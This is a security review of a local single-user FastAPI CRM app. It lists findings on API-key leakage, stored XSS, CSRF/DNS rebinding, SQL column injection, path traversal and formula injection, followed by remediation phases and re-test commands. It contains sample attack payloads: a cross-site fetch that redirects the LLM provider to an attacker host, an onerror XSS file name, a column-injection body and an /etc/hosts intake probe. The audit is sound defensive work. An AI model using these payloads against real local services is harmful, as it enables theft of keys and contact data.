# SECURITY_REVIEW — CRM_Local

**Reviewed:** 2026-11-07 · **Reviewer:** security-engineer (Round 2) · **Target:** HEAD `7610095`, clean tree
**Method:** every claim below re-verified against source with `file:line`; runtime probes via FastAPI `TestClient` (read-only); prior status docs treated as hypotheses per D-001.

---

## 1. Threat model (tightened)

Single-user, localhost-only FastAPI app; SQLite at `~/.crm_local/`; no auth by design (explicit non-goal). In scope:

1. **Malicious file content** — crafted documents/emails that manipulate extraction, prompt-inject the LLM, exploit native parsers (xlrd/PyMuPDF/openpyxl), or smuggle active content into the UI (stored XSS).
2. **Accidental network exposure** — binding beyond loopback; browser-reachable cross-origin abuse of the local API (CSRF, DNS rebinding) is treated as part of this axis, because the attack surface is "whatever the user's browser can reach".
3. **Secret exposure** — LLM `api_key` values reaching browser JS, logs, error pages, exports, or git.
4. **Local path traversal** — crafted file/folder inputs (HTTP params, symlinks) causing reads outside intended directories.
5. **Data integrity** — tampering with the SQLite file, backups, or extraction results (incl. column-level SQL injection and formula injection in exports).

Out of scope: cloud auth, multi-tenancy, TLS, physical/multi-user OS attackers with same-UID access, supply-chain compromise of pinned wheels.

**Shared-file constraint:** `services/eml_processor.py`, `services/eml_dedup_rules.py`, `services/parser.py` are byte-identical to `/home/kushal_jain/PROJECTS/CRM_Developer` (verified with `diff` this session). Any fix inside those three files must be mirrored to the reference in the same change. Findings that touch them are marked **[SHARED]**.

---

## 2. Findings

Severity is judged against the threat model above (not a cloud baseline). Counts: **Critical 0 · High 2 · Medium 3 · Low 9** (14 total).

| ID | Sev | Location | Issue | Exploit scenario | Remediation | Target phase |
|---|---|---|---|---|---|---|
| **SEC-01** | **High** | `app.py:106-112` (GET /api/config), `app.py:160-163` (GET /api/settings), `app.py:125` & `app.py:172` (POST echoes), consumed at `static/app.js:305,312,327-339,344-350` | **Anchor finding — LLM `chain[].api_key` returned to browser JS** in full config, on **four** endpoints (GET+POST × /api/config+/api/settings). `addProvider()` round-trips the key through `prompt()` and re-POSTs the whole config. | Any XSS (SEC-02), malicious browser extension, devtools sniff, or DNS-rebinding read (SEC-03) exfiltrates every configured provider key. Threat #3, direct hit. | D-011: retire `/api/config`; `/api/settings` returns `api_key_set: bool` (masked), never the key. Write path accepts a new key only when non-empty (keep old otherwise). Server-side only from Phase 1 on. | Phase 1 (D-011) |
| **SEC-02** | **High** | `static/app.js:253` (city), `app.js:268` (source_file), `app.js:86` (file names), `app.js:124` (r.file/r.error), `app.js:64,130,144,218,241,298` (e.message); `esc()` at `app.js:168` escapes only `&<>` and is **not** used at these sinks | **Stored/DOM XSS from untrusted extraction fields, file names and server error strings** — 26 `innerHTML` sinks; `esc()` exists but the data-derived sinks don't use it. A crafted CSV/XLSX cell in `city`, or a file named `<img src=x onerror=…>`, is rendered raw when the user opens Analytics / Extract. | User processes a malicious file (threat #1) → payload stored in `contacts.city`/`source_file` → opening Analytics executes attacker JS **same-origin** → `fetch('/api/config')` (SEC-01) → API keys + full PII exfiltrated. | Escape every data-derived sink with `esc()` (or switch to `textContent`); add `"`/`'` to `esc()` for future attribute use; Phase 6: CSP header (SEC-14) + sanitizer for any HTML email body rendering (Emails view is still a placeholder at `app.js:216` — keep it that way until a sanitizer exists). | Phase 6 (interim one-line escapes in Phase 1 — keys exist today) |
| **SEC-03** | Medium | `app.py:32-38` (only header middleware; no Origin/Host check), `app.py:115-125,136-145,253-256` (state-changing POSTs), bind at `app.py:304,311` | **No browser-origin controls:** FastAPI does not enforce request `Content-Type` (verified: `POST /api/intake` with `text/plain` reached body validation → 422, not 415), so a cross-site page can issue **simple requests** (no preflight) to every POST endpoint; no `Host` allowlist either. | (a) CSRF write: malicious page does `fetch('http://127.0.0.1:PORT/api/config',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:'{"chain":[{"provider":"ollama","base_url":"http://attacker","model":"x","enabled":true}]}'})` → next scan posts email bodies to attacker. Same trick hits `/api/test-llm` (beacon/SSRF), `/api/scan`, `/api/pick-folder` (pops dialogs). (b) DNS rebinding: attacker domain rebinds to 127.0.0.1 → same-origin → **reads** `GET /api/config` (defeats the fact that CORS blocks normal cross-origin reads). | One middleware: reject requests whose `Origin` header is present and not `http://127.0.0.1:<port>`/`http://localhost:<port>` (403); additionally require `Host` ∈ {127.0.0.1, localhost}[:port]. Optionally require `Content-Type: application/json` on JSON endpoints. | Phase 1 |
| **SEC-04** | Medium | `db.py:502-506` (`update_contact` builds `f"{k} = ?"` from request keys), `app.py:66-67` (`ContactIn.fields: dict`, unvalidated), `app.py:186-197` | **Column-name injection + mass assignment in `PATCH /api/contacts/{which}/{id}`** — values are parameterized but **column names come straight from the JSON body** with no whitelist. | Caller with API access (incl. SEC-03/SEC-04 chains) sends `{"fields":{"name = (SELECT …), name":"x"}}` → subquery executes in `SET`; or simply writes any column (`id`, `email_key`, `source_file`, future `deleted_at`) → silent data-integrity corruption. Stacked queries are blocked by `sqlite3`, so impact is integrity not RCE. | Whitelist keys against the `contacts` column set (reuse the `_table()` pattern at `app.py:70-75`); reject unknown keys with 422. Apply the same whitelist to any future bulk/staging update APIs. | Phase 1 |
| **SEC-05** | Medium | `app.py:136-145` (`paths: list[str]` straight from request), `intake.py:36-51` (opens whatever it's given) | **No path containment on `/api/intake`** — any absolute/relative path with an allowed extension anywhere on disk can be read, ingested into the DB, then exported. Also CSRF-able (SEC-03: simple POST with `?paths=`). | Malicious page or local process points intake at `~/secrets/contacts.csv` / another profile's data → content lands in `crm.db` → visible in Contacts/Export. Threat #4, confirmed. | D-009: replace path-list intake with multipart upload (file bytes, not server-side paths); until then, restrict `paths` to files under the configured `crm_dir`/`eml_dir`. | Phase 4 |
| **SEC-06** | Low | `intake.py:19-22,48-59` | **Magic-bytes validation is partial** — only `.xls` and `.pdf` checked; `.xlsx` (PK zip), `.eml` (MIME headers), `.csv`/`.txt` trust the extension alone. (Prior claim "magic bytes landed" = **PARTIAL**.) | Crafted extension-mismatched file steers the wrong parser; low impact today because openpyxl/stdlib email parser fail closed on garbage, but the gate is incomplete for a stated control. | Add `PK\x03\x04` for `.xlsx`, `^(From \|Received:\|MIME-Version:)` for `.eml`, and NUL-byte/UTF-8 sanity for `.csv`/`.txt` in `_MAGIC`. | Phase 4 |
| **SEC-07** | Low | `pipeline.py:118-119` & `parse.py:143-144` (whole-file `read()`, **no size cap on the scan path**), `services/adapters/xlsx.py:21` (`list(iter_rows())`), `csv.py:18` (`list(reader)`); contrast caps at `intake.py:14-16` and timeouts at `services/parser.py:18,82-83` | **Resource-exhaustion controls exist only on intake** — folder scan (incl. auto-`watch`, `pipeline.py:273-295`) reads files of any size and materializes all rows; a decompression-bomb `.xlsx` in a watched folder can OOM the app unattended. | Threat #1: crafted small-zip/large-unzip xlsx dropped into the watched dir → watcher scans it → memory exhaustion → local DoS. | Enforce `MAX_FILE_SIZE` in `_pending()`/`_process_doc` (skip + `mark_processed` with `error`); cap rows per sheet/CSV (e.g. 100k) in adapters. | Phase 4 |
| **SEC-08** | Low | `export.py:37-44` (`_sanitize` covers `= + - @` only); no CSV/VCF/ZIP export exists yet (only `app.py:214-228` XLSX) | **Formula-injection coverage PARTIAL** — XLSX path sanitized (sufficient: openpyxl writes explicit string cells); `\t`/`\r` prefixes (OWASP list) not covered; future CSV/VCF exports (D-013) have no rules yet. | Crafted source file → contact field `=HYPERLINK("http://evil","click")` → future CSV export → Excel evaluates on open. | Keep `_sanitize` for XLSX (add `\t`,`\r` to the prefix tuple); before any CSV export ships, apply OWASP rule (prefix `'` to leading `=+-@\t\r`); VCF values need newline/colon escaping. | Phase 4 (at export build time) |
| **SEC-09** | Low | `config.py:56-60` (`save()` never chmods); observed `~/.crm_local/config.json` = `-rw-r--r--` (0644), backups `config.json.bak`/`*.db.bak` also 0644 | **Secrets at rest are world-readable** — mitigated on this box because `~` is 0700, but the guarantee depends entirely on home-dir perms; on Windows it inherits the profile ACL. | Same-UID malware or a misconfigured home perms change exposes stored `chain[].api_key`. | `os.chmod(p, 0o600)` after `os.replace` in `save()` (matches spec §12 "File perms 0600", `docs/ADVANCED_EXTRACTION_SPEC.md:244`); same for backups. | Phase 1 |
| **SEC-10** **[SHARED]** | Low | `services/eml_processor.py:266-269` (`Subject/From/To/Date` interpolated **uncapped** into the prompt; body/signature are capped at `:166`, `:263`) | **Uncapped headers in LLM prompt** — a crafted EML with a multi-MB Subject (scan path has no size cap, SEC-07) inflates token cost / can blow the provider request. Wrapping itself (BEGIN/END UNTRUSTED) is correct. | Threat #1 cost/DoS: file in watched dir → prompt balloons → API cost spike or 400s on every scan cycle. | Cap `subject` (e.g. 200 chars) and addr fields inside `build_llm_prompt`. **Mirror to CRM_Developer in the same change.** | Phase 1 |
| **SEC-11** | Low | `intake.py:78` (`llm.extract` — but only `from llm import parse_json` at `intake.py:10`; no `import llm`) | **EML+chain intake path is dead code (NameError)** — LLM enrichment in dropzone never runs; also dead line `intake.py:61`. A security control that never executes cannot be tested; when Phase 4 rewires intake, the wrapping must be preserved. | None today (fails closed). Risk is regression: the fix could re-wire LLM without `build_llm_prompt`. | Fix during D-009 intake rework: `import llm` (or import `extract`), keep `build_llm_prompt` wrapping; add the missing test. | Phase 4 |
| **SEC-12** | Low | `intake.py:41,44,49,123` (raw `str(exc)` incl. absolute paths returned to browser), `pipeline.py:34-49` log → `/api/status` (`app.py:90-103`), rendered at `app.js:124,130` | **Error strings leak local filesystem paths** and are second-order XSS sinks (they flow into `innerHTML`). No tracebacks leak (FastAPI default 500, debug off — verified generic responses). | Local path disclosure to any page/script that can read API responses; amplifier for SEC-02. | Return stable error codes to the UI, log details server-side only; escape at the render sinks (SEC-02). | Phase 6 |
| **SEC-13** | Low | `.gitignore` (covers `*.db`, `.env` — **not** `config.json`, not `data_backup/`; `.coverage` is tracked per `git ls-files`) | **Ignore-list gaps** — no secrets/DBs are tracked today (`git ls-files` clean — CONFIRMED), but a config copied into the repo or a future backup in `data_backup/` would be committable. | Accidental commit of API keys/PII. | Add `config.json`, `config.json.bak`, `*.db-*`, `data_backup/`; untrack `.coverage`. | Phase 1 |
| **SEC-14** | Low | `app.py:32-38` (nosniff / X-Frame-Options DENY / Referrer-Policy only) | **No CSP** — the XSS sinks in SEC-02 have no second line of defense. | Amplifies SEC-02→SEC-01 key theft. | Add `Content-Security-Policy: default-src 'self'` (no inline scripts once the UI migrates off inline `onclick` — Phase 6 work). | Phase 6 |

### Prior-doc security claims — verdicts

| Claim (source) | Verdict | Evidence |
|---|---|---|
| `/api/config` returns `chain[].api_key` to browser (`CRM_FEATURE_PARITY.md:20,88,247`) | **CONFIRMED — and broader** | `app.py:106-112`; also `GET /api/settings` `app.py:160-163` and both POST echoes `app.py:125,172` leak identically; consumed `app.js:305,327-339`. `GET /api/status` clean (verified: keys = counts/pending/providers/run/version). |
| Formula-injection sanitize (`CRM_FEATURE_PARITY.md:73,299`) | **CONFIRMED for XLSX** / forward-risk for CSV | `export.py:37-44`; no CSV export exists to sanitize (grep: only `app.py:214-228` XLSX). `\t`/`\r` prefixes missing → SEC-08. |
| Magic bytes validation landed (`CRM_FEATURE_PARITY.md:69,319`) | **PARTIAL** | Present for `.xls`/`.pdf` only (`intake.py:19-22,54-59`); `.xlsx`/`.eml`/`.csv`/`.txt` extension-only → SEC-06. |
| Security headers present (`CRM_FEATURE_PARITY.md:300`) | **CONFIRMED** (with gap) | `app.py:32-38`; TestClient probe shows `x-content-type-options`, `x-frame-options: DENY`, `referrer-policy` on responses. No CSP → SEC-14. |
| `openapi_url=None` disables docs (`CRM_FEATURE_PARITY.md:300`) | **CONFIRMED** | `app.py:30`; probe: `/docs`, `/openapi.json`, `/redoc` all **404**. |
| Prompt-injection wrapping (`CRM_FEATURE_PARITY.md:297,315`) | **CONFIRMED (mechanism) / PARTIAL (coverage+tests)** | Both `llm.extract` call sites wrap via `build_llm_prompt` (`pipeline.py:125`, `intake.py:78` — grep shows these are the **only** callers) and `SYSTEM_PROMPT` carries the data-only instruction (`llm.py:16`); untrusted content never reaches a `system` param (`llm.py:157,172`). But intake's call is dead (SEC-11) and Local has **no** injection test (reference does: `CRM_Developer/tests/test_prompt_injection.py`). |
| Log redaction (`CRM_FEATURE_PARITY.md:322`) | **PARTIAL** | Only `llm._redact` on provider error strings (`llm.py:142-144`, used `:163,176`); no generic layer. Acceptable today because uvicorn access log is off (`log_level="warning"`, `app.py:311`) and no other code path formats keys into messages — but this is incidental, not enforced. |
| Loopback-only binding (`CRM_FEATURE_PARITY.md:40,127`) | **CONFIRMED** | `host = "127.0.0.1"` `app.py:304`; port probe binds `127.0.0.1` `app.py:294`; single `uvicorn.run` `app.py:311`; **zero** `CORSMiddleware`/`Access-Control` matches repo-wide; no `0.0.0.0` anywhere (spec/bat/iss checked). |
| No CDN / no telemetry (`CRM_FEATURE_PARITY.md:249,252`) | **CONFIRMED** | `grep -rniE "cdn\|unpkg\|jsdelivr\|googleapis\|cloudflare" static/` → zero; http(s) URL grep on static → zero; telemetry grep (sentry/posthog/analytics/tracking) → zero hits in code. |
| No secrets tracked in git | **CONFIRMED** | `git ls-files \| grep -iE "config\|\.db\|secret\|key"` → only `config.py`. Gaps → SEC-13. |
| SQL values parameterized / table names whitelisted | **CONFIRMED for values & tables; REFUTED for column names** | Values: all queries use `?` (`db.py:484-493,498,505,510,524-536`); tables: HTTP path goes through `_table()` whitelist (`app.py:70-75`), other callers pass literals. **But** `db.py:503` interpolates request-controlled column names → SEC-04. |
| Size/count caps on intake (`CRM_FEATURE_PARITY.md:69`) | **PARTIAL** | Intake: 10 MB/file, 100 MB/batch, 50 files (`intake.py:14-16`, `app.py:142-143`) — CONFIRMED. Scan/watch path: no size cap at all → SEC-07. |
| No hardcoded provider/key | **CONFIRMED** | `config.py:13` (`chain: []` default); `llm.extract` returns `"no provider configured"` on empty (`llm.py:150-151`); repo grep for key patterns → none. Ollama default is local `http://localhost:11434` (`llm.py:83`). |
| Rate limiting | **ABSENT (acknowledged)** | No limiter anywhere. Accepted for loopback single-user (see §5); note it becomes relevant only if the bind ever changes. |

---

## 3. Remediation plan, ordered by phase

**Phase 1 — data foundations (do first; all backend, minimal diff):**
1. **SEC-01 (D-011):** delete `GET/POST /api/config`; make `/api/settings` the only surface; mask `api_key` → `api_key_set` on read; on write, keep stored key when the client sends `""`. Update `app.js:305,327-350` in the same change (it is the only consumer).
2. **SEC-03:** one FastAPI middleware (extend the existing one at `app.py:32-38`): 403 on foreign `Origin`, 400 on non-loopback `Host`. ~10 lines, no deps.
3. **SEC-04:** whitelist `ContactIn.fields` keys against the `contacts` column set (raise 422 otherwise).
4. **SEC-09:** `os.chmod(0o600)` in `config.save()`.
5. **SEC-10 [SHARED]:** cap header lengths in `build_llm_prompt` — **mirror to CRM_Developer in the same commit**.
6. **SEC-13:** `.gitignore` additions; `git rm --cached .coverage`.
7. Stopgap for **SEC-02**: wrap `app.js:253,268,86,124` (and the `e.message` sinks) in `esc()` — 6 one-line edits; full fix stays Phase 6.

**Phase 2 — staging:** no new findings, but carry two forward requirements: (a) any API returning `staged_contacts.raw_source_data` (D-017) must reuse the masked-settings pattern for secrets and treat raw rows as untrusted at render time; (b) Phase 1's Origin/Host middleware must be re-verified after D-010 moves routes into `api/` (middleware lives on the app, so it survives — QA re-check).

**Phase 4 — extraction & import:** SEC-05 (multipart upload per D-009 — eliminates server-side path input), SEC-06 (complete `_MAGIC`), SEC-07 (size/row caps on scan path + adapters), SEC-08 (formula rules at CSV/VCF build time, D-013), SEC-11 (fix `intake.py:78` NameError during the intake rework, keeping `build_llm_prompt`).

**Phase 6 — UI:** SEC-02 full fix (systemic escaping / `textContent`, `esc()` gains quote escaping), SEC-12 (stop returning raw `str(exc)`), SEC-14 (CSP — requires moving off inline `onclick`, already on the Phase 6 board). Emails-view body rendering (today a placeholder, `app.js:216`) must land with a sanitizer, never raw `innerHTML`.

**Phase 7 — QA & security:** port `CRM_Developer/tests/test_prompt_injection.py` (adapt `llm_router` → `llm.SYSTEM_PROMPT`), add the regression tests in §4, re-run the whole checklist against HEAD.

**Shared-file mirror reminder:** only **SEC-10** touches a byte-identical shared file today (`services/eml_processor.py`). Any future hardening of `build_llm_prompt`/`parser.py`/`eml_dedup_rules.py` inherits the same mirror requirement — flag it in the PR that touches them.

---

## 4. Verification steps (QA re-test)

```bash
# SEC-01 — leak request/response (FAILS today: api_key visible; PASS after D-011)
curl -s http://127.0.0.1:PORT/api/config   | python3 -m json.tool   # must NOT contain "api_key"
curl -s http://127.0.0.1:PORT/api/settings | python3 -m json.tool   # "api_key_set": true only
# add a provider first via UI, then re-run both; assert: grep -c api_key <response> == 0

# SEC-03 — Origin/Host gate (FAILS today: 200/422; PASS: 403/400)
curl -si -X POST http://127.0.0.1:PORT/api/config \
  -H 'Origin: https://evil.example' -H 'Content-Type: text/plain' \
  -d '{"crm_dir":"/tmp/x"}' | head -1        # expect HTTP/1.1 403
curl -si http://127.0.0.1:PORT/api/status -H 'Host: evil.example' | head -1  # expect 400

# SEC-04 — column whitelist (FAILS today: executes/500; PASS: 422)
curl -si -X PATCH http://127.0.0.1:PORT/api/contacts/crm/1 \
  -H 'Content-Type: application/json' \
  -d '{"fields":{"name = (SELECT 1), name":"x"}}' | head -1   # expect 422

# SEC-05 — path containment (FAILS today: processes arbitrary path; PASS: 400/403)
# NOTE: the endpoint reads the JSON *body* — a `?paths=` query form returns 400 "No files provided".
curl -si -X POST 'http://127.0.0.1:PORT/api/intake' \
  -H 'Content-Type: application/json' \
  -d '{"paths":["/etc/hosts"]}' | head -1   # FAILS today: 200 + ingested; PASS: 400/403

# SEC-06/07 — caps: drop a 11 MB .pdf and a PK-zip .xlsx renamed .pdf into the watched
# dir → both must be skipped with "too large"/"content does not match" within one watch cycle.

# SEC-13 — no CDN refs, no secrets in git (must stay zero)
grep -rniE "https?://(cdn\.|unpkg|jsdelivr|cdnjs|fonts\.googleapis)" static/ ; echo "exit=$?"
git ls-files | grep -iE "config\.json|\.db$|secret|api[_-]?key" ; echo "exit=$?"

# Loopback (must stay): ss -ltnp | grep python  → only 127.0.0.1:8xxx
```

Pytest ideas (Phase 7):
```python
def test_settings_never_returns_api_key(client):     # SEC-01
    client.post("/api/settings", json={"chain":[{"provider":"x","model":"m","api_key":"sk-secret","enabled":True}]})
    assert "sk-secret" not in client.get("/api/settings").text

def test_config_masked_roundtrip(client): ...        # api_key_set bool, write "" keeps old key

def test_patch_rejects_unknown_columns(client):      # SEC-04
    r = client.patch("/api/contacts/crm/1", json={"fields":{"id": 999}})
    assert r.status_code == 422

def test_foreign_origin_rejected(client):            # SEC-03
    r = client.post("/api/scan", json={"which":"all"}, headers={"Origin":"https://evil.example"})
    assert r.status_code == 403

def test_analytics_sinks_escape():                   # SEC-02 (static)
    js = open("static/app.js").read()
    assert "esc(c.city" in js and "esc(c.source_file" in js   # or equivalent sink audit

# port of reference: tests/test_prompt_injection.py (wrapping + data-only system prompt)
```
Runtime probes used in this review (re-runnable read-only): `TestClient(app).get("/docs")` → 404; `POST /api/intake` with `Content-Type: text/plain` → 422 body-validation (proves content-type is not enforced, the SEC-03 precondition); response header dump → the three security headers present.

---

## 5. Non-issues / accepted local risks

- **No auth / no TLS / no multi-tenancy** — explicit non-goals for a loopback single-user app; the loopback bind (verified `app.py:304`) is the auth boundary.
- **No CORS headers** — correct as-is: cross-origin *reads* are already blocked by the browser; only the *write* side needs the SEC-03 Origin check. Adding `allow_origins=["*"]` would be a regression.
- **Rate limiting** — not implemented and not flagged: the only caller is the machine's own user; brute-forcing a localhost API has no attacker. Becomes relevant only if the bind ever changes (then re-review).
- **HSTS / HTTPS** — N/A on `http://127.0.0.1`.
- **Same-UID access to `~/.crm_local/*.db`** — any process as the user can read/modify the SQLite file; that is OS-level, outside a local app's boundary. SEC-09 only tightens *other-user* readability (0600).
- **`LIKE` wildcard chars in `q` (`db.py:483`)** and `size=-1` unbounded pages — cosmetic quirks of parameterized search; no injection (values are bound), single-user impact only.
- **`/api/open-folder` → `os.startfile`/`xdg-open` (`app.py:239-250`)** — path is `isdir`-checked and passed as an argv list (no shell), so no command injection; opening directories only launches the file manager.
- **`os.walk` symlinked directories (`pipeline.py:59`)** — not followed (`followlinks=False` default); file symlinks inside the scanned dir are read (extension-checked) — accepted, the user chose the folder.
- **LLM output validation** — `parse_json` caps field lengths and validates email/website formats (`llm.py:47-73`), `merge_fields` only reads `FIELD_KEYS` (unknown model keys are dropped, `eml_processor.py:275-287`), local-wins prevents overwrite of good data. Adequate — the residual risk is *content* of allowed fields reaching `innerHTML`, which is SEC-02, not an LLM-validation gap.
- **`db.py` triplicated `connect()` definitions / dead code** — code quality, not security; noted so Phase 1 refactors don't mistake them for separate paths.
- **Error tracebacks** — FastAPI default (debug off) returns generic 500s; verified no traceback leakage. Only message strings with paths are an issue (SEC-12).
- **Reference-repo parity** — `CRM_Developer/api/settings.py:47-49` has the same key leak (behind its own `verify_token`); fixing it there is outside this repo's scope but should ride along with the D-011 change if the reference is still live.
